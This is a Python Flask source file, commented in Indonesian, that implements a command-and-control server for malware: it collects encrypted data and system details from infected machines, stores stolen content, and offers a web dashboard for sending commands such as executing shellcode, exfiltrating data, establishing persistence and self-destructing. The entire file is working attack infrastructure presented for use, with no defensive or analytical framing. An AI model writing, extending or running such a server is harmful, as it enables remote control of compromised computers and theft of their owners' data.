#!/usr/bin/env python3
import os
import sys
import json
import base64
import hashlib
import threading
import time
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

app = Flask(__name__)
CORS(app)

# Konfigurasi server
CONFIG = {
    'HOST': '0.0.0.0',
    'PORT': 8080,
    'DEBUG': False,
    'SECRET_KEY': 'your-secret-key-here',
    'DATABASE_FILE': 'c2_database.json',
    'LOG_FILE': 'c2_server.log',
    'MAX_CONNECTIONS': 100,
    'ENCRYPTION_KEY': b'2b7e151628aed2a6abf7158809cf4f3c',  # 32-byte key untuk AES-256
    'HMAC_KEY': b'2b7e151628aed2a6abf7158809cf4f3c',       # 32-byte key untuk HMAC
}

# Database untuk menyimpan informasi tentang koneksi malware
class C2Database:
    def __init__(self, db_file):
        self.db_file = db_file
        self.lock = threading.Lock()
        self.data = self._load_database()
    
    def _load_database(self):
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def _save_database(self):
        with self.lock:
            with open(self.db_file, 'w') as f:
                json.dump(self.data, f, indent=2)
    
    def add_client(self, client_id, client_info):
        with self.lock:
            self.data[client_id] = {
                'id': client_id,
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'info': client_info,
                'commands': [],
                'data': []
            }
            self._save_database()
    
    def update_client(self, client_id, update_data):
        with self.lock:
            if client_id in self.data:
                self.data[client_id].update(update_data)
                self.data[client_id]['last_seen'] = datetime.now().isoformat()
                self._save_database()
                return True
            return False
    
    def get_client(self, client_id):
        with self.lock:
            return self.data.get(client_id, None)
    
    def get_all_clients(self):
        with self.lock:
            return list(self.data.values())
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id in self.data:
                self.data[client_id]['commands'].append({
                    'command': command,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'pending'
                })
                self._save_database()
                return True
            return False
    
    def get_commands(self, client_id):
        with self.lock:
            if client_id in self.data:
                commands = [cmd for cmd in self.data[client_id]['commands'] if cmd['status'] == 'pending']
                # Mark commands as sent
                for cmd in self.data[client_id]['commands']:
                    if cmd['status'] == 'pending':
                        cmd['status'] = 'sent'
                self._save_database()
                return commands
            return []
    
    def add_data(self, client_id, data_type, data_content):
        with self.lock:
            if client_id in self.data:
                self.data[client_id]['data'].append({
                    'type': data_type,
                    'content': data_content,
                    'timestamp': datetime.now().isoformat()
                })
                self._save_database()
                return True
            return False

# Inisialisasi database
db = C2Database(CONFIG['DATABASE_FILE'])

# Fungsi untuk logging
def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    print(log_entry)
    with open(CONFIG['LOG_FILE'], 'a') as f:
        f.write(log_entry)

# Fungsi enkripsi/dekripsi AES-GCM
def encrypt_aes_gcm(plaintext, key, nonce=None):
    if nonce is None:
        nonce = os.urandom(12)  # 96-bit nonce untuk GCM
    
    # Enkripsi dengan AES-GCM
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Enkripsi data
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    
    # Dapatkan tag autentikasi
    tag = encryptor.tag
    
    # Kembalikan nonce + tag + ciphertext
    return nonce + tag + ciphertext

def decrypt_aes_gcm(ciphertext, key):
    # Ekstrak nonce, tag, dan ciphertext
    nonce = ciphertext[:12]
    tag = ciphertext[12:28]
    actual_ciphertext = ciphertext[28:]
    
    # Dekripsi dengan AES-GCM
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    
    # Dekripsi data
    plaintext = decryptor.update(actual_ciphertext) + decryptor.finalize()
    
    return plaintext

# Fungsi untuk menghitung HMAC sederhana (sesuai dengan implementasi malware)
def calculate_hmac(data, hmac_key):
    hmac_result = bytearray(32)
    for i in range(32):
        hmac_result[i] = data[i % len(data)] ^ hmac_key[i]
    return bytes(hmac_result)

# Fungsi untuk memverifikasi HMAC
def verify_hmac(data, hmac_key, received_hmac):
    calculated_hmac = calculate_hmac(data, hmac_key)
    return calculated_hmac == received_hmac

# Endpoint untuk menerima data dari malware
@app.route('/data', methods=['POST'])
def receive_data():
    try:
        # Ambil data dari request
        encrypted_data = request.data
        
        # Ekstrak nonce, HMAC, dan ciphertext
        nonce = encrypted_data[:12]
        received_hmac = encrypted_data[12:44]
        ciphertext = encrypted_data[44:]
        
        # Verifikasi HMAC
        if not verify_hmac(ciphertext, CONFIG['HMAC_KEY'], received_hmac):
            log_message("HMAC verification failed")
            return jsonify({"status": "error", "message": "HMAC verification failed"}), 400
        
        # Dekripsi data
        decrypted_data = decrypt_aes_gcm(encrypted_data, CONFIG['ENCRYPTION_KEY'])
        
        # Parse data (asumsikan data adalah JSON)
        try:
            data = json.loads(decrypted_data.decode('utf-8'))
        except:
            # Jika bukan JSON, simpan sebagai data biner
            data = {
                'type': 'binary',
                'content': base64.b64encode(decrypted_data).decode('utf-8')
            }
        
        # Ekstrak client ID dari data
        client_id = data.get('client_id', 'unknown')
        
        # Jika client baru, tambahkan ke database
        if not db.get_client(client_id):
            client_info = {
                'user_agent': request.headers.get('User-Agent', ''),
                'ip_address': request.remote_addr,
                'hostname': data.get('hostname', ''),
                'os_version': data.get('os_version', ''),
                'fingerprint': data.get('fingerprint', '')
            }
            db.add_client(client_id, client_info)
            log_message(f"New client connected: {client_id}")
        
        # Update informasi client
        db.update_client(client_id, {
            'ip_address': request.remote_addr,
            'last_seen': datetime.now().isoformat()
        })
        
        # Simpan data yang diterima
        data_type = data.get('type', 'unknown')
        db.add_data(client_id, data_type, data)
        
        # Log data yang diterima
        log_message(f"Received data from {client_id}: {data_type}")
        
        # Dapatkan perintah yang menunggu untuk client ini
        commands = db.get_commands(client_id)
        
        # Jika ada perintah, kirim kembali
        if commands:
            # Buat response dengan perintah
            response_data = {
                'commands': commands,
                'timestamp': datetime.now().isoformat()
            }
            
            # Enkripsi response
            response_json = json.dumps(response_data).encode('utf-8')
            encrypted_response = encrypt_aes_gcm(response_json, CONFIG['ENCRYPTION_KEY'])
            
            # Hitung HMAC untuk response
            response_hmac = calculate_hmac(encrypted_response[12+16:], CONFIG['HMAC_KEY'])
            
            # Gabungkan nonce + HMAC + ciphertext
            full_response = encrypted_response[:12] + response_hmac + encrypted_response[12:]
            
            log_message(f"Sent {len(commands)} commands to {client_id}")
            return full_response, 200, {'Content-Type': 'application/octet-stream'}
        
        # Jika tidak ada perintah, kirim response kosong
        empty_response = encrypt_aes_gcm(b'{"status": "no_commands"}', CONFIG['ENCRYPTION_KEY'])
        response_hmac = calculate_hmac(empty_response[12+16:], CONFIG['HMAC_KEY'])
        full_response = empty_response[:12] + response_hmac + empty_response[12:]
        
        return full_response, 200, {'Content-Type': 'application/octet-stream'}
    
    except Exception as e:
        log_message(f"Error processing request: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Endpoint untuk dashboard C2
@app.route('/')
def dashboard():
    return """
    <html>
    <head>
        <title>Advanced C2 Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            h1 { color: #333; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            tr:nth-child(even) { background-color: #f9f9f9; }
            .command-form { margin: 20px 0; padding: 15px; background-color: #f5f5f5; border-radius: 5px; }
            .form-group { margin-bottom: 10px; }
            label { display: inline-block; width: 120px; }
            input, select, textarea { padding: 5px; width: 300px; }
            button { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
            button:hover { background-color: #45a049; }
        </style>
    </head>
    <body>
        <h1>Advanced C2 Dashboard</h1>
        
        <div class="command-form">
            <h2>Send Command</h2>
            <form id="commandForm">
                <div class="form-group">
                    <label for="clientId">Client ID:</label>
                    <select id="clientId" name="clientId" required>
                        <option value="">Select a client</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="commandType">Command Type:</label>
                    <select id="commandType" name="commandType" required>
                        <option value="update">Update</option>
                        <option value="shellcode">Execute Shellcode</option>
                        <option value="exfiltrate">Exfiltrate Data</option>
                        <option value="persistence">Establish Persistence</option>
                        <option value="self_destruct">Self-Destruct</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="commandData">Command Data:</label>
                    <textarea id="commandData" name="commandData" rows="4" placeholder="Enter command data (base64 encoded)"></textarea>
                </div>
                <button type="submit">Send Command</button>
            </form>
        </div>
        
        <h2>Connected Clients</h2>
        <table id="clientsTable">
            <thead>
                <tr>
                    <th>Client ID</th>
                    <th>First Seen</th>
                    <th>Last Seen</th>
                    <th>IP Address</th>
                    <th>Hostname</th>
                    <th>OS Version</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <!-- Client data will be loaded here -->
            </tbody>
        </table>
        
        <script>
            // Load clients data
            fetch('/api/clients')
                .then(response => response.json())
                .then(data => {
                    const clientsTable = document.getElementById('clientsTable').getElementsByTagName('tbody')[0];
                    const clientIdSelect = document.getElementById('clientId');
                    
                    data.forEach(client => {
                        // Add to table
                        const row = clientsTable.insertRow();
                        row.insertCell(0).textContent = client.id;
                        row.insertCell(1).textContent = new Date(client.first_seen).toLocaleString();
                        row.insertCell(2).textContent = new Date(client.last_seen).toLocaleString();
                        row.insertCell(3).textContent = client.info.ip_address;
                        row.insertCell(4).textContent = client.info.hostname;
                        row.insertCell(5).textContent = client.info.os_version;
                        
                        const actionsCell = row.insertCell(6);
                        const viewDataBtn = document.createElement('button');
                        viewDataBtn.textContent = 'View Data';
                        viewDataBtn.onclick = () => viewClientData(client.id);
                        actionsCell.appendChild(viewDataBtn);
                        
                        // Add to select dropdown
                        const option = document.createElement('option');
                        option.value = client.id;
                        option.textContent = client.id;
                        clientIdSelect.appendChild(option);
                    });
                });
            
            // Handle command form submission
            document.getElementById('commandForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const clientId = document.getElementById('clientId').value;
                const commandType = document.getElementById('commandType').value;
                const commandData = document.getElementById('commandData').value;
                
                fetch('/api/command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        client_id: clientId,
                        command_type: commandType,
                        command_data: commandData
                    })
                })
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    document.getElementById('commandData').value = '';
                })
                .catch(error => {
                    alert('Error: ' + error.message);
                });
            });
            
            // Function to view client data
            function viewClientData(clientId) {
                fetch(`/api/client/${clientId}/data`)
                    .then(response => response.json())
                    .then(data => {
                        let dataHtml = `<h3>Data for Client: ${clientId}</h3>`;
                        dataHtml += '<table border="1">';
                        dataHtml += '<tr><th>Type</th><th>Timestamp</th><th>Content</th></tr>';
                        
                        data.forEach(item => {
                            dataHtml += '<tr>';
                            dataHtml += `<td>${item.type}</td>`;
                            dataHtml += `<td>${new Date(item.timestamp).toLocaleString()}</td>`;
                            dataHtml += `<td>${item.content.substring(0, 100)}${item.content.length > 100 ? '...' : ''}</td>`;
                            dataHtml += '</tr>';
                        });
                        
                        dataHtml += '</table>';
                        
                        const newWindow = window.open('', '_blank');
                        newWindow.document.write(dataHtml);
                        newWindow.document.close();
                    })
                    .catch(error => {
                        alert('Error: ' + error.message);
                    });
            }
        </script>
    </body>
    </html>
    """

# API endpoint untuk mendapatkan daftar client
@app.route('/api/clients', methods=['GET'])
def api_get_clients():
    clients = db.get_all_clients()
    return jsonify(clients)

# API endpoint untuk mendapatkan data client tertentu
@app.route('/api/client/<client_id>/data', methods=['GET'])
def api_get_client_data(client_id):
    client = db.get_client(client_id)
    if not client:
        return jsonify({"status": "error", "message": "Client not found"}), 404
    
    return jsonify(client.get('data', []))

# API endpoint untuk mengirim perintah ke client
@app.route('/api/command', methods=['POST'])
def api_send_command():
    try:
        data = request.json
        client_id = data.get('client_id')
        command_type = data.get('command_type')
        command_data = data.get('command_data', '')
        
        if not client_id or not command_type:
            return jsonify({"status": "error", "message": "Missing required parameters"}), 400
        
        # Format perintah sesuai dengan yang diharapkan malware
        command = {
            'type': command_type,
            'data': command_data,
            'timestamp': datetime.now().isoformat()
        }
        
        # Tambahkan perintah ke database
        if db.add_command(client_id, command):
            log_message(f"Command {command_type} sent to {client_id}")
            return jsonify({"status": "success", "message": "Command sent successfully"})
        else:
            return jsonify({"status": "error", "message": "Failed to send command"}), 500
    
    except Exception as e:
        log_message(f"Error sending command: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Fungsi untuk menjalankan server
def run_server():
    log_message(f"Starting C2 server on {CONFIG['HOST']}:{CONFIG['PORT']}")
    app.run(host=CONFIG['HOST'], port=CONFIG['PORT'], debug=CONFIG['DEBUG'], threaded=True)

if __name__ == '__main__':
    run_server()